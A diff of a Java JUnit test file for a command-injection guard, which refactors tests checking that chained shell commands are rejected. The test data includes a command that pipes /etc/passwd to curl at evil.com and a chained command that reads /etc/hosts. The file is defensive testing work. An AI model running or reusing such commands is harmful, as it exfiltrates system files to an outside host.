@@ -7,14 +7,15 @@ import java.io.File;
 import java.io.IOException;
 import java.util.Collections;
 import java.util.Set;
+import java.util.stream.Stream;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.Arguments;
+import org.junit.jupiter.params.provider.MethodSource;
 import org.junit.jupiter.params.provider.ValueSource;
 
 final class SystemCommandTest {
-
-  private Runtime rt;
 
   @BeforeEach
   void setup() {
@@ -55,8 +56,7 @@ final class SystemCommandTest {
 
   @Test
   void it_allows_chains_if_turned_off() throws IOException {
-    SystemCommand.runCommand(
-        rt, "/bin/sh -c \"cat /etc/passwd | curl http://evil.com/\"", Collections.emptySet());
+    SystemCommand.runCommand(rt, injectCatPasswordIntoCurl, Collections.emptySet());
   }
 
   @Test
@@ -161,29 +161,56 @@ final class SystemCommandTest {
                 Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
   }
 
-  @Test
-  void it_protects_stringarray_environmentarray() {
-    String[] cmd = {"/bin/sh", "-c", "ls \"foo\" && cat \"/etc/hosts\""};
-    String[] envp = {"FOO=BAR"};
-    assertThrows(
-        SecurityException.class,
-        () ->
-            SystemCommand.runCommand(
-                rt, cmd, envp, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
+  interface BadCommandRunner {
+    void runCommand() throws IOException;
   }
 
-  @Test
-  void it_protects_stringarray_environmentarray_file() {
-    String[] cmd = {"/bin/sh", "-c", "ls \"foo\" && cat \"/etc/hosts\""};
-    String[] envp = {"FOO=BAR"};
-    assertThrows(
-        SecurityException.class,
-        () ->
-            SystemCommand.runCommand(
-                rt,
-                cmd,
-                envp,
-                new File("."),
-                Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
+  @ParameterizedTest
+  @MethodSource("badCommandRunners")
+  void it_tests_all_signatures(final BadCommandRunner badCommandRunner) {
+    assertThrows(SecurityException.class, badCommandRunner::runCommand);
   }
+
+  public static Stream<Arguments> badCommandRunners() {
+    return Stream.of(
+        Arguments.of(
+            (BadCommandRunner)
+                () ->
+                    SystemCommand.runCommand(
+                        rt,
+                        cmdArrayWithInjectedCatCmd,
+                        envp,
+                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
+            (BadCommandRunner)
+                () ->
+                    SystemCommand.runCommand(
+                        rt,
+                        cmdArrayWithInjectedCatCmd,
+                        envp,
+                        new File("."),
+                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
+            (BadCommandRunner)
+                () ->
+                    SystemCommand.runCommand(
+                        rt,
+                        injectCatPasswordIntoCurl,
+                        envp,
+                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
+            (BadCommandRunner)
+                () ->
+                    SystemCommand.runCommand(
+                        rt,
+                        injectCatPasswordIntoCurl,
+                        envp,
+                        new File("."),
+                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING))));
+  }
+
+  private static Runtime rt;
+  private static final String[] envp = {"FOO=BAR"};
+  private static final String[] cmdArrayWithInjectedCatCmd = {
+    "/bin/sh", "-c", "ls \"foo\" && cat \"/etc/hosts\""
+  };
+  private static final String injectCatPasswordIntoCurl =
+      "/bin/sh -c \"cat /etc/passwd | curl http://evil.com/\"";
 }
